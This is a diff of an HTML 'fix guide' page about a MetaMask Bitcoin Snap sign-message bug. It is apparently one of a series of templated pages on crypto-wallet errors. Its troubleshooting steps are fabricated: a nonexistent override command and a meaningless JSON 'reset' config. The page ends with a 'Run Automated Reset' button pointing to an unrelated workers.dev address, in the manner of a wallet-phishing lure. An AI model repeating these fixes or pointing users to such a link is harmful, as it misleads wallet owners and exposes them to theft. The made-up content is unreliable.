@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sign Message Clicking Back Button In The – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #121214;
+        font-family: -apple-system;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,35 @@
 <h1>Metamask Extension Bug Sign Message Clicking Back Button In The</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue when using the Metamask extension to sign a message, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation dialog. The expected behavior is not observed, and the user is left with an unclear outcome.</li>
+<li>Users experience a bug when using the Metamask extension to sign a message, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation window. The error results in an inconsistent state, causing frustration and potential security concerns.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timing issue between the Metamask extension's internal state and the external Bitcoin Snap Sign Message dialog. When the back button is clicked, the extension's state is not properly reset, leading to unexpected behavior.</li>
+<li>The error occurs due to a mismatch between the expected state of the sign message process and the actual state after clicking the back button. This discrepancy leads to an unpredictable behavior, causing the Metamask extension to malfunction.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, the following manual overrides can be attempted:</li>
-<li>Clear the Metamask extension's cache and storage</li>
-<li>Reset the Bitcoin Snap Sign Message dialog's internal state</li>
-<li>Execute a manual override using the following command:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Check the Ethereum network configuration to ensure it matches the expected settings.</li>
+<li>Verify the Bitcoin Snap Sign Message configuration for any inconsistencies.</li>
+<li>Use the following JSON configuration to reset the sign message process:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-extension<span class="w"> </span>overrides<span class="w"> </span>resetSignMessageState
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;signMessage&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;reset&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ethereum&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced troubleshooting.</p>
+<p>Consider utilizing an external console to execute these overrides for a more streamlined experience.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Bitcoin Snap Sign Message dialog configured correctly</li>
-<li>Latest version of the Ethereum blockchain client synced and running</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum network selected</li>
+<li>Bitcoin Snap Sign Message configuration accessible</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
